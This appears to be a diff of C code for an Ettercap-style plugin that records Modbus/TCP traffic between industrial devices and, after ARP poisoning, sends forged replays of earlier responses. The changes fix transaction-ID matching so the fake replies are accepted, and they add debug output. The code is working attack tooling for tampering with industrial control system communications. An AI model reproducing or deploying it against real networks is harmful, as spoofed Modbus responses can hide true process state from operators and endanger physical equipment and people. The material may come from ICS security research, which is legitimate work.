@@ -652,8 +652,11 @@ static void find_request_response_pair(struct request_response_item **output_req
 	// walk through the list
 	
 	while (curr != NULL){
+                // don't want to compare the tid and other parts...
+		// so start comparison at offset 4 (0-indexed)
+		// 
 		if ((curr->mrrp.requestDataLen == requestlen) &&
-			memcmp(curr->mrrp.requestData, requestdata, requestlen)){
+			memcmp(&curr->mrrp.requestData[4], &requestdata[4], requestlen-4)){
 			*output_request_response_item = curr;
 			return;
 		}
@@ -812,7 +815,7 @@ static void modbus_handle_request(struct packet_object *po){
 		}else{ /* is_request(s, PACKET) */
 			if (PACKET->DATA.len != 0){
 				if(&((session_data_t*)s->data)->current_request_response_item == NULL){
-					printf("--> ERROR: request was not in list, try expanding time of packet capture. Allowing response through\n");
+					printf("--> ERROR: request was not in list, try expanding time of packet capture. Allowing response through\n"); // do i need to do something to actually transmit the packet?
 					return;
 				}
 				// overwrite response data and data length with saved values
@@ -823,7 +826,7 @@ static void modbus_handle_request(struct packet_object *po){
                 }
                 printf("\n");
                 
-                printf("The data that I would be overwriting it with: ");
+                printf("The original packet that I would be overwriting it with: ");
                 for(i = 0; i < ((session_data_t*)s->data)->current_request_response_item->mrrp.responseDataLen; i++){
                     printf("%02x ", ((session_data_t*)s->data)->current_request_response_item->mrrp.responseData[i]);
                 }
@@ -850,11 +853,18 @@ static void modbus_handle_request(struct packet_object *po){
                 
                 
                 SAFE_CALLOC(tempdata, newlen, sizeof(u_char));
-                
+
                 memset(tempdata, 0, newlen); // zero out buffer
-                memcpy(tempdata, newresp, newlen); // copy previously recorded response into buffer
-                tempdata[1] = 0x41;
+                memcpy(tempdata, newresp, newlen); // copy previously recorded response into buffer. note we need to copy tid from original request
+		// now copy the original tid
+		memcpy(tempdata, PACKET->DATA.data, 2); // tid only
+                //tempdata[1] = 0x41;
                 // send fake reply
+		printf("Sending fake reply\n");
+		printf("Data: ");
+		for(i = 0; i < newlen; i++){
+			printf("%02x ", tempdata[i]);
+		}
                 send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, po->L4.flags, tempdata, newlen);
                 /* Stuff above is the good stuff */
                 
@@ -890,13 +900,16 @@ static void record_modbus(struct packet_object *po){
 	session_data_t tempSessionData;
     // first need to determine if it's a modbus packet...
     if (!modbus_vcr_is_modbus(po)){
-		printf("*******Non-modbus packet detected!*******\n");
+		//printf("*******Non-modbus packet detected!*******\n");
 		return;
 	}else{
-        printf("*******Modbus packet detected!*******\n");
+        //printf("*******Modbus packet detected!*******\n");
     }
     // if it's a SYN packet, we need to set up a new session...
     //po->flags |= PO_DROPPED;  // NO, we don't want to drop the damn thing!
+    // 2017: we should also check to see if a session exists between these hosts on the session pool,
+    // because we may want to use previously recorded replay, like when arp poison glitch causes the hosts
+    // to reset their connection
     if ((po->flags & PO_FORWARDABLE) &&
         (po->L4.flags & TH_SYN) &&
         !(po->L4.flags & TH_ACK)){
@@ -920,11 +933,13 @@ static void record_modbus(struct packet_object *po){
         } else {
 			printf("record_modbus: unforwardable or non-syn/non-ack packet detected, handling\n");
 			if (po->flags & PO_FORWARDABLE){
+				printf("record_modbus: forwardable packet, but not syn\n");
 				// forwardable packet, let's deal with it
 				modbus_handle_request(PACKET);
 			}else{
 				// not forwardable, not a synpacket, we ignore the stream?
-	            po->flags |= PO_IGNORE;
+				printf("record_modbus: unforwardable packet, ignoring\n");
+	            		po->flags |= PO_IGNORE;
 			}
         }
 	// if it's not a SYN packet, we need to deal with the actual packet data...
